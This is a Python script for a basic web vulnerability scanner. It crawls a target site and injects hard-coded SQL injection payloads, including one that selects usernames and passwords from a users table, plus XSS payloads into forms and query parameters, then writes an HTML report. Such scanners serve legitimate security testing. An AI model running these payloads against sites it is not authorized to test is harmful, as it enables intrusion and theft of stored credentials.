import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import sys
import html  # used to escape output for report

# SQL injection test values
sql_payloads = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"a\"=\"a",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT username, password FROM users--",
    "' OR '1'='1",
    "' OR 1=1 LIMIT 1--",
    "1' AND 1=0 UNION SELECT null, null--",
    "' OR sleep(3)--",       
]


# XSS test values
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
    "'><svg/onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'>",
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>"
]


# SQL error messages to check
sql_errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "sqlstate",
    "unclosed quotation mark",
    "quoted string not properly terminated"
]

# to save detected issues
found_issues = []

# check if the URL is valid
def check_url(u):
    try:
        result = urlparse(u)
        return result.scheme in ['http', 'https']
    except:
        return False

# get form data
def get_form_info(form):
    form_info = {}
    form_info['action'] = form.attrs.get('action', '').lower()
    form_info['method'] = form.attrs.get('method', 'get').lower()
    form_info['inputs'] = []

    for tag in form.find_all(["input", "textarea", "select"]):
        name = tag.attrs.get("name")
        value = tag.attrs.get("value", "")
        type_ = tag.attrs.get("type", "text")
        if name:
            form_info['inputs'].append({"name": name, "value": value, "type": type_})
    return form_info

# get forms from page
def find_forms(url, session):
    forms = []
    try:
        r = session.get(url)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
    except:
        pass
    return forms

# crawl and collect pages and forms
def crawl(start_url, session):
    seen = set()
    to_visit = [start_url]
    all_forms = []

    while to_visit:
        current = to_visit.pop(0)
        if current in seen:
            continue
        seen.add(current)
        print("[*] Crawling:", current)

        try:
            r = session.get(current)
            soup = BeautifulSoup(r.text, "html.parser")

            for a_tag in soup.find_all("a", href=True):
                new_url = urljoin(current, a_tag['href'])
                if check_url(new_url) and urlparse(new_url).netloc == urlparse(start_url).netloc:
                    if new_url not in seen and new_url not in to_visit:
                        to_visit.append(new_url)

            forms = soup.find_all("form")
            for form in forms:
                info = get_form_info(form)
                info['url'] = urljoin(current, info['action'])
                all_forms.append(info)
        except:
            continue

    return list(seen), all_forms

# test for sql injection
def test_sql(url, method, params, session):
    for key in params:
        for payload in sql_payloads:
            test_params = params.copy()
            test_params[key] = payload
            try:
                if method == "get":
                    r = session.get(url, params=test_params)
                else:
                    r = session.post(url, data=test_params)
                for error in sql_errors:
                    if error.lower() in r.text.lower():
                        print(f"[!] SQL Injection found at {url} using {payload}")
                        found_issues.append(("SQL Injection", url, method.upper(), key, payload))
                        return
            except:
                continue

# test for xss
def test_xss(url, method, params, session):
    for key in params:
        for payload in xss_payloads:
            test_params = params.copy()
            test_params[key] = payload
            try:
                if method == "get":
                    r = session.get(url, params=test_params)
                else:
                    r = session.post(url, data=test_params)
                if payload in r.text:
                    print(f"[!] XSS found at {url} using {payload}")
                    found_issues.append(("XSS", url, method.upper(), key, payload))
                    return
            except:
                continue

# run scanning process
def run_scan(base_url):
    print("[+] Starting scan on", base_url)
    session = requests.Session()
    urls, forms = crawl(base_url, session)

    for u in urls:
        parsed = urlparse(u)
        query = parse_qs(parsed.query)
        if query:
            flat_query = {k: v[0] for k, v in query.items()}
            test_sql(u, "get", flat_query, session)
            test_xss(u, "get", flat_query, session)

    for f in forms:
        url = f['url']
        method = f['method']
        inputs = {i['name']: i['value'] for i in f['inputs']}
        test_sql(url, method, inputs, session)
        test_xss(url, method, inputs, session)

    print("\n[+] Scan Done.")
    print("[+] Generating Report...\n")
    make_report(base_url)

# save report to html file
def make_report(base_url):
    parsed = urlparse(base_url)
    domain_name = parsed.netloc.replace(":", "_")
    report_filename = f"report_{domain_name}.html"

    html_report = "<html><head><title>Scan Report</title></head><body>"
    html_report += "<h2>Scan Report</h2>"

    if not found_issues:
        html_report += "<p>No issues found.</p>"
        print("No issues found.")
    else:
        html_report += "<table border='1'><tr><th>Type</th><th>URL</th><th>Method</th><th>Parameter</th><th>Payload</th></tr>"
        for issue in found_issues:
            typ, url, method, param, payload = issue
            safe_url = html.escape(url)
            safe_param = html.escape(param)
            safe_payload = html.escape(payload)
            html_report += f"<tr><td>{typ}</td><td>{safe_url}</td><td>{method}</td><td>{safe_param}</td><td>{safe_payload}</td></tr>"
            print(f"[!] {typ} at {url} [{method}] param: {param} payload: {payload}")
        html_report += "</table>"

    html_report += "</body></html>"

    with open(report_filename, "w", encoding='utf-8') as f:
        f.write(html_report)

    print(f"\n[+] Report saved to {report_filename}")

# command line input
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Target URL (with http://www.example.com)", required=True)
    args = parser.parse_args()

    if not check_url(args.url):
        print("[-] Error: Please include http:// or https:// in the URL.")
        sys.exit(1)

    run_scan(args.url)
